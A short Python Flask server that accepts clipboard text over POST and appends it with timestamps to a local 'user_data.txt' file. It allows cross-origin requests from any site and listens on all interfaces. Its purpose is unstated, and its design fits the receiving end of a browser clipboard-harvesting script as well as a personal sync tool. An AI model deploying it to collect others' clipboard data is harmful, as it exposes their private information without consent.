from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)

CLIPBOARD_LOG_FILE = "user_data.txt"

@app.route('/clipboard', methods=['POST'])
def receive_clipboard():
    print("Received a request to /clipboard endpoint")
    try:
        data = request.json
        print("Request data:", data)  # Debug print
        
        clipboard_text = data.get('text', '')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"[{timestamp}] {clipboard_text}\n"
        print("Writing to console:", log_entry)  # Debug print
        
        # Ensure the file path exists
        print(f"Writing to file: {os.path.abspath(CLIPBOARD_LOG_FILE)}")
        with open(CLIPBOARD_LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
            f.flush()  # Force write to disk
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'POST')
    return response

if __name__ == '__main__':
    print(f"Server starting. Clipboard data will be saved to: {os.path.abspath(CLIPBOARD_LOG_FILE)}")
    app.run(host='0.0.0.0', port=1234)